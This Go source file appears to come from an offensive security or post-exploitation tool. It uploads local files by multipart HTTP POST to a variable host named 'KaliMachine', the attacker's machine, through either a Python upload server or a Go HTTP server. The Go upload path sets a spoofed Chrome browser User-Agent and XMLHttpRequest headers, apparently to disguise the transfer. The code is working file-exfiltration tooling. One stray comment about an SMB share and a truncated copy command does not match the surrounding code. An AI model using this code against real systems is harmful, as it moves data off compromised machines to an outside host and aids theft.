package cmd

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func UploadFile(lpath string, rpath string) {
	// Check if GoHTTPServer or PythonHTTPServer
	isPythonHTTPServer, err := CheckHTTPServerType()
	if err != nil {
		Log.Debugf("No HTTP Server on %s:%d\n", KaliMachine, HttpServerPort)
		return
	}
	if isPythonHTTPServer {
		url := fmt.Sprintf("http://%s:%d/upload", KaliMachine, UploadServerPort)
		err := doUpload(url, lpath) // Description: Upload a file to the SMB share
		// Example: copy /Y C:\path\to\file.txt \\
		if err != nil {
			fmt.Println(err)
			return
		} else {
			return
		}
	} else {
		url := fmt.Sprintf("http://%s:%d/%s", KaliMachine, HttpServerPort, GoHTTPServerPath)
		err := doUploadGo(url, lpath)
		if err != nil {
			fmt.Println(err)
			return
		} else {
			return
		}
	}
}

func doUploadGo(url string, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		Log.Errorf("failed to open file: %v", err)
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
	if err != nil {
		Log.Errorf("failed to create form file: %v", err)
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		Log.Errorf("failed to copy file content: %v", err)
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	err = writer.Close()
	if err != nil {
		Log.Errorf("failed to close writer: %v", err)
		return fmt.Errorf("failed to close writer: %v", err)
	}

	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		Log.Errorf("failed to create request: %v", err)
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		Log.Errorf("failed to perform request: %v", err)
		return fmt.Errorf("failed to perform request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		Log.Errorf("unexpected status code: %d", resp.StatusCode)
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	fmt.Println("File uploaded successfully")
	return nil
}

func doUpload(url string, filePath string) error {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		Log.Errorf("Error opening file: %v\n", err)
		return fmt.Errorf("error opening file: %v", err)
	}
	defer file.Close()

	// Create a buffer to write our multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Create a form file field
	part, err := writer.CreateFormFile("files", filepath.Base(file.Name()))
	if err != nil {
		Log.Errorf("Error creating form file: %v\n", err)
		return fmt.Errorf("error creating form file: %v", err)
	}

	// Copy the file content to the form file field
	_, err = io.Copy(part, file)
	if err != nil {
		Log.Errorf("Error copying file content: %v\n", err)
		return fmt.Errorf("error copying file content: %v", err)
	}

	// Close the multipart writer to set the terminating boundary
	err = writer.Close()
	if err != nil {
		Log.Errorf("Error closing writer: %v\n", err)
		return fmt.Errorf("error closing writer: %v", err)
	}

	// Create a new HTTP request with the form data
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		Log.Errorf("Error creating request: %v\n", err)
		return fmt.Errorf("error creating request: %v", err)
	}

	// Set the content type to multipart/form-data
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		Log.Errorf("Error sending request: %v\n", err)
		return fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()

	isPythonHTTPServer, _ := CheckHTTPServerType()

	if isPythonHTTPServer {
		// Check the response status
		if resp.StatusCode != 204 {
			Log.Errorf("Bad status: %s\n", resp.Status)
			return fmt.Errorf("bad status: %s", resp.Status)
		}
	}
	Log.Debugf("File %s uploaded successfully\n", filePath)
	fmt.Printf("\nFile %s uploaded successfully\n", filePath)
	return nil
}
